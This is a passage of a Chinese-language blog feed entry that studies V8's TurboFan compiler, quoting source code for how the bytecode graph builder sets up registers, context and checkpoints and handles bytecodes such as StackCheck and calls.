class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Registers</span></span><br><span class="line">  register_base_ = <span class="keyword">static_cast</span>&lt;<span class="keyword">int</span>&gt;(values()-&gt;<span class="built_in">size</span>());</span><br><span class="line">  Node* undefined_constant = builder-&gt;jsgraph()-&gt;UndefinedConstant();</span><br><span class="line">  values()-&gt;insert(values()-&gt;<span class="built_in">end</span>(), register_count, undefined_constant);</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">DEFINE_GETTER(UndefinedConstant, HeapConstant(factory()-&gt;undefined_value()))</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="comment">// valuev8::internal::Handle&lt;v8::internal::HeapObject&gt;</span></span><br><span class="line"><span class="function">Node* <span class="title">JSGraph::HeapConstant</span><span class="params">(Handle&lt;HeapObject&gt; value)</span> </span>&#123;</span><br><span class="line">  Node** loc = cache_.FindHeapConstant(value);</span><br><span class="line">  <span class="keyword">if</span> (*loc == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">    *loc = graph()-&gt;NewNode(common()-&gt;HeapConstant(value));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> *loc;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">const</span> Operator* <span class="title">CommonOperatorBuilder::HeapConstant</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">const</span> Handle&lt;HeapObject&gt;&amp; value)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> (zone()) Operator1&lt;Handle&lt;HeapObject&gt;&gt;(  <span class="comment">// --</span></span><br><span class="line">      IrOpcode::kHeapConstant, Operator::kPure,       <span class="comment">// opcode</span></span><br><span class="line">      <span class="string">"HeapConstant"</span>,                                 <span class="comment">// name</span></span><br><span class="line">      <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>,                               <span class="comment">// counts</span></span><br><span class="line">      value);                                         <span class="comment">// parameter</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先从cache中检查是否已经有HeapConstant,如果没有就新建再返回，如果有就直接返回cache里的。</p><p>然后再向value_的最后插入一个undefined_constant节点作为Accumulator。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Accumulator</span></span><br><span class="line">accumulator_base_ = <span class="keyword">static_cast</span>&lt;<span class="keyword">int</span>&gt;(values()-&gt;<span class="built_in">size</span>());</span><br><span class="line">values()-&gt;push_back(undefined_constant);</span><br></pre></td></tr></table></figure><p>然后设置Context</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">// Context</span></span><br><span class="line">  <span class="keyword">int</span> context_index = Linkage::GetJSCallContextParamIndex(parameter_count);</span><br><span class="line">  <span class="keyword">const</span> Operator* op = common()-&gt;Parameter(context_index, <span class="string">"%context"</span>);</span><br><span class="line">  context_ = builder-&gt;graph()-&gt;NewNode(op, graph()-&gt;start());</span><br><span class="line">  ...</span><br><span class="line">  ...</span><br><span class="line">  ...</span><br><span class="line">    <span class="comment">// A special &#123;Parameter&#125; index for JSCalls that represents the context.</span></span><br><span class="line">  <span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">GetJSCallContextParamIndex</span><span class="params">(<span class="keyword">int</span> parameter_count)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> parameter_count + <span class="number">2</span>;  <span class="comment">// Parameter (arity + 2) is special.</span></span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">  ...</span><br><span class="line">  <span class="function"><span class="keyword">const</span> Operator* <span class="title">CommonOperatorBuilder::Parameter</span><span class="params">(<span class="keyword">int</span> index,</span></span></span><br><span class="line"><span class="function"><span class="params">                                                 <span class="keyword">const</span> <span class="keyword">char</span>* debug_name)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!debug_name) &#123;</span><br><span class="line">    <span class="keyword">switch</span> (index) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CACHED_PARAMETER(index) \</span></span><br><span class="line">  <span class="keyword">case</span> index:                   \</span><br><span class="line">    <span class="keyword">return</span> &amp;cache_.kParameter##index##Operator;</span><br><span class="line">      CACHED_PARAMETER_LIST(CACHED_PARAMETER)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> CACHED_PARAMETER</span></span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// Uncached.</span></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> (zone()) Operator1&lt;ParameterInfo&gt;(  <span class="comment">// --</span></span><br><span class="line">      IrOpcode::kParameter, Operator::kPure,     <span class="comment">// opcode</span></span><br><span class="line">      <span class="string">"Parameter"</span>,                               <span class="comment">// name</span></span><br><span class="line">      <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>,                          <span class="comment">// counts</span></span><br><span class="line">      ParameterInfo(index, debug_name));         <span class="comment">// parameter info</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><em>context也创建了一个parameter的node，用来做什么的我还没看懂，可能需要好好看看log或者compiler/linkage.h这个文件</em></p><h4 id="VisitBytecodes"><a href="#VisitBytecodes" class="headerlink" title="VisitBytecodes"></a>VisitBytecodes</h4><p>V8准备一个称为v8::internal::AstVisitor的基类，简称AstVisitor，从AST生成bytecode。<br>AstVisitor是一个使用Vistor模式的类。<br>在深度优先搜索AST时调用相应的回调函数。<br>生成的bytecode存放在bytecode数组当中，用Javascript来模拟这个结构，看起来像这样。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-06-090746.jpg" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-06-090832.jpg" alt=""><br>当然这个并不重要，回顾一下而已。</p><p>VisitBytecodes首先进行bytecode_analysis，在这里面进行包括liveness分析等。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BytecodeAnalysis <span class="title">bytecode_analysis</span><span class="params">(bytecode_array(), local_zone(),</span></span></span><br><span class="line"><span class="function"><span class="params">                                   analyze_environment_liveness())</span></span>;</span><br><span class="line">bytecode_analysis.Analyze(osr_offset_);</span><br><span class="line">set_bytecode_analysis(&amp;bytecode_analysis);</span><br><span class="line"></span><br><span class="line"><span class="function">interpreter::BytecodeArrayIterator <span class="title">iterator</span><span class="params">(bytecode_array())</span></span>;</span><br><span class="line">set_bytecode_iterator(&amp;iterator);</span><br><span class="line"><span class="function">SourcePositionTableIterator <span class="title">source_position_iterator</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    handle(bytecode_array()-&gt;SourcePositionTable()))</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (analyze_environment_liveness() &amp;&amp; FLAG_trace_environment_liveness) &#123;</span><br><span class="line">  <span class="function">OFStream <span class="title">of</span><span class="params">(<span class="built_in">stdout</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">  bytecode_analysis.PrintLivenessTo(of);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果想观察liveness过程，可以启用这个flag<br><code>DEFINE_BOOL(trace_environment_liveness, false,            &quot;trace liveness of local variable slots&quot;)</code></p><p>bytecode_array被设置迭代，然后通过VisitSingleBytecode一个个处理。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (; !iterator.done(); iterator.Advance()) &#123;</span><br><span class="line">  VisitSingleBytecode(&amp;source_position_iterator);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数前面就是一些获取bytecode并偏移寻找下一个还有一些其他判断，主要的内容其实是这个大的switch case，对不同bytecode进行不同处理。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">switch</span> (iterator.current_bytecode()) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BYTECODE_CASE(name, ...)       \</span></span><br><span class="line">  <span class="keyword">case</span> interpreter::Bytecode::k#<span class="meta">#name: \</span></span><br><span class="line">    Visit#<span class="meta">#name();                     \</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">      BYTECODE_LIST(BYTECODE_CASE)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> BYTECODE_CODE</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>BYTECODE_LIST在bytecode.h里，太长了就不列了。</p><p>VisitSingleBytecode里有很多分支，我捡一些写一下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[generated bytecode for function: foo]</span><br><span class="line">Parameter count 2</span><br><span class="line">Frame size 24</span><br><span class="line">   80 E&gt; 0x186d973a4f8a @    0 : a0                StackCheck</span><br><span class="line">   97 S&gt; 0x186d973a4f8b @    1 : 28 02 00 00       LdaNamedProperty a0, [0], [0]</span><br><span class="line">         0x186d973a4f8f @    5 : 26 fb             Star r0</span><br><span class="line">         0x186d973a4f91 @    7 : 0c 64             LdaSmi [100]</span><br><span class="line">         0x186d973a4f93 @    9 : 26 f9             Star r2</span><br><span class="line">   97 E&gt; 0x186d973a4f95 @   11 : 57 fb 02 f9 02    CallProperty1 r0, a0, r2, [2]</span><br><span class="line">  110 S&gt; 0x186d973a4f9a @   16 : a4                Return</span><br><span class="line">Constant pool (size &#x3D; 1)</span><br><span class="line">0x186d973a4f19: [FixedArray] in OldSpace</span><br><span class="line"> - map: 0x186d90c023c1 &lt;Map&gt;</span><br><span class="line"> - length: 1</span><br><span class="line">           0: 0x186dc2812029 &lt;String[7]: indexOf&gt;</span><br><span class="line">Handler Table (size &#x3D; 0)</span><br></pre></td></tr></table></figure><ul><li>VisitStackCheck<br>在为StackCheck构建node之前，如果没有一个能够支配（effect-dom)它的checkpoint节点，那么会先创建一个精确的checkpoint节点。<br>于是在PrepareEagerCheckpoint调用<code>Node* node = NewNode(common()-&gt;Checkpoint());</code><br>即使我们在某种情况下跳过了checkpoint的创建，依然会染着Effect边为StackCheck寻找一个能够支配（effect-dom)它的Checkpoint。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">V(Checkpoint, Operator::kKontrol, 0, 1, 1, 0, 1, 0)</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">BytecodeGraphBuilder::VisitStackCheck</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  PrepareEagerCheckpoint();</span><br><span class="line">  Node* node = NewNode(javascript()-&gt;StackCheck());</span><br><span class="line">  environment()-&gt;RecordAfterState(node, Environment::kAttachFrameState);</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">BytecodeGraphBuilder::PrepareEagerCheckpoint</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (needs_eager_checkpoint()) &#123;</span><br><span class="line">    <span class="comment">// Create an explicit checkpoint node for before the operation. This only</span></span><br><span class="line">    <span class="comment">// needs to happen if we aren't effect-dominated by a &#123;Checkpoint&#125; already.</span></span><br><span class="line">    mark_as_needing_eager_checkpoint(<span class="literal">false</span>);</span><br><span class="line">    Node* node = NewNode(common()-&gt;Checkpoint());</span><br><span class="line">    DCHECK_EQ(<span class="number">1</span>, OperatorProperties::GetFrameStateInputCount(node-&gt;op()));</span><br><span class="line">    DCHECK_EQ(IrOpcode::kDead,</span><br><span class="line">              NodeProperties::GetFrameStateInput(node)-&gt;opcode());</span><br><span class="line">    <span class="function">BailoutId <span class="title">bailout_id</span><span class="params">(bytecode_iterator().current_offset())</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> BytecodeLivenessState* liveness_before =</span><br><span class="line">        bytecode_analysis()-&gt;GetInLivenessFor(</span><br><span class="line">            bytecode_iterator().current_offset());</span><br><span class="line"></span><br><span class="line">    Node* frame_state_before = environment()-&gt;Checkpoint(</span><br><span class="line">        bailout_id, OutputFrameStateCombine::Ignore(), liveness_before);</span><br><span class="line">    NodeProperties::ReplaceFrameStateInput(node, frame_state_before);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// In case we skipped checkpoint creation above, we must be able to find an</span></span><br><span class="line">    <span class="comment">// existing checkpoint that effect-dominates the nodes about to be created.</span></span><br><span class="line">    <span class="comment">// Starting a search from the current effect-dependency has to succeed.</span></span><br><span class="line">    Node* effect = environment()-&gt;GetEffectDependency();</span><br><span class="line">    <span class="keyword">while</span> (effect-&gt;opcode() != IrOpcode::kCheckpoint) &#123;</span><br><span class="line">      DCHECK(effect-&gt;op()-&gt;HasProperty(Operator::kNoWrite));</span><br><span class="line">      DCHECK_EQ(<span class="number">1</span>, effect-&gt;op()-&gt;EffectInputCount());</span><br><span class="line">      effect = NodeProperties::GetEffectInput(effect);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></li><li>VisitLdaNamedProperty<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">const</span> Operator* <span class="title">JSOperatorBuilder::LoadNamed</span><span class="params">(Handle&lt;Name&gt; name,</span></span></span><br><span class="line"><span class="function"><span class="params">                                             <span class="keyword">const</span> VectorSlotPair&amp; feedback)</span> </span>&#123;</span><br><span class="line">  <span class="function">NamedAccess <span class="title">access</span><span class="params">(LanguageMode::kSloppy, name, feedback)</span></span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> (zone()) Operator1&lt;NamedAccess&gt;(           <span class="comment">// --</span></span><br><span class="line">      IrOpcode::kJSLoadNamed, Operator::kNoProperties,  <span class="comment">// opcode</span></span><br><span class="line">      <span class="string">"JSLoadNamed"</span>,                                    <span class="comment">// name</span></span><br><span class="line">      <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>,                                 <span class="comment">// counts</span></span><br><span class="line">      access);                                          <span class="comment">// parameter</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>VisitStar</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">BytecodeGraphBuilder::BuildCall</span><span class="params">(ConvertReceiverMode receiver_mode,</span></span></span><br><span class="line"><span class="function"><span class="params">                                     Node* <span class="keyword">const</span>* args, <span class="keyword">size_t</span> arg_count,</span></span></span><br><span class="line"><span class="function"><span class="params">                                     <span class="keyword">int</span> slot_id)</span> </span>&#123;</span><br><span class="line">  DCHECK_EQ(interpreter::Bytecodes::GetReceiverMode(</span><br><span class="line">                bytecode_iterator().current_bytecode()),</span><br><span class="line">            receiver_mode);</span><br><span class="line">  PrepareEagerCheckpoint();</span><br><span class="line"></span><br><span class="line">  VectorSlotPair feedback = CreateVectorSlotPair(slot_id);</span><br><span class="line"></span><br><span class="line">  CallFrequency frequency = ComputeCallFrequency(slot_id);</span><br><span class="line">  <span class="keyword">const</span> Operator* op =</span><br><span class="line">      javascript()-&gt;Call(arg_count, frequency, feedback, receiver_mode,</span><br><span class="line">                         GetSpeculationMode(slot_id));</span><br><span class="line">  JSTypeHintLowering::LoweringResult lowering = TryBuildSimplifiedCall(</span><br><span class="line">      op, args, <span class="keyword">static_cast</span>&lt;<span class="keyword">int</span>&gt;(arg_count), feedback.slot());</span><br><span class="line">  <span class="keyword">if</span> (lowering.IsExit()) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  Node* node = <span class="literal">nullptr</span>;</span><br><span class="line">  <span class="keyword">if</span> (lowering.IsSideEffectFree()) &#123;</span><br><span class="line">    node = lowering.value();</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    DCHECK(!lowering.Changed());</span><br><span class="line">    node = ProcessCallArguments(op, args, <span class="keyword">static_cast</span>&lt;<span class="keyword">int</span>&gt;(arg_count));</span><br><span class="line">  &#125;</span><br><span class="line">  environment()-&gt;BindAccumulator(node, Environment::kAttachFrameState);</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">const</span> Operator* <span class="title">JSOperatorBuilder::Call</span><span class="params">(<span class="keyword">size_t</span> arity, CallFrequency frequency,</span></span></span><br><span class="line"><span class="function"><span class="params">                                        VectorSlotPair <span class="keyword">const</span>&amp; feedback,</span></span></span><br><span class="line"><span class="function"><span class="params">                                        ConvertReceiverMode convert_mode,</span></span></span><br><span class="line"><span class="function"><span class="params">                                        SpeculationMode speculation_mode)</span> </span>&#123;</span><br><span class="line">  DCHECK_IMPLIES(speculation_mode == SpeculationMode::kAllowSpeculation,</span><br><span class="line">                 feedback.IsValid());</span><br><span class="line">  <span class="function">CallParameters <span class="title">parameters</span><span class="params">(arity, frequency, feedback, convert_mode,</span></span></span><br><span class="line"><span class="function"><span class="params">                            speculation_mode)</span></span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> (zone()) Operator1&lt;CallParameters&gt;(   <span class="comment">// --</span></span><br><span class="line">      IrOpcode::kJSCall, Operator::kNoProperties,  <span class="comment">// opcode</span></span><br><span class="line">      <span class="string">"JSCall"</span>,                                    <span class="comment">// name</span></span><br><span class="line">      parameters.arity(), <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>,           <span class="comment">// inputs/outputs</span></span><br><span class="line">      parameters);                                 <span class="comment">// parameter</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;总览&quot;&gt;&lt;a href=&quot;#总览&quot; class=&quot;headerlink&quot; title=&quot;总览&quot;&gt;&lt;/a&gt;总览&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span 
      
    
    </summary>
    
    
      <category term="浏览器" scheme="http://eternalsakura13.com/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    
      <category term="v8" scheme="http://eternalsakura13.com/tags/v8/"/>
    
  </entry>
  
</feed>
